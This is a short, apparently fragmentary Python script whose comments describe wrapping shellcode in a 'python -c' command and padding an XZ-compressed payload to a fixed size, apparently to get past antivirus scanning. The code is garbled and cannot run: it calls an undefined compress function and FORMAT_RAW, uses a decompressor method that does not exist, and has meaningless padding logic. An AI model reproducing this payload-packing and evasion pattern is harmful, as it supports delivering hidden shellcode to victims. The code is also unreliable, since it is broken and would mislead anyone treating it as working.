from lzma import LZMADecompressor
LZMADecompressor()

# prefix and suffix of the decompressed buffer
prefix = b'Python script, ASCII text executable'
suffix = b'.py'


# pyshellcode use to wrap payload into python cde
def pyshellcode(shellcode):
    return b'python -c "%s"%%s' % shellcode


# genoutput use to generate XZ-compressed payload
def genoutput(shellcode):
    # padding data to align compressed av to 0x2d000
    size = 0x2d000 - len(prefix) - len(shellcode) - len(suffix)
    padding = [b'A' * (size // len(b'A')), b'A' * (size % len(b'A'))]
    inputdata = b''.join(padding) + shellcode

    # generate output data
    output = b''
    compressor = LZMADecompressor()
    for block in compress(inputdata, format=FORMAT_RAW):
        output += b'p' + compressor.uncompress(block)

    return prefix + output + suffix


#
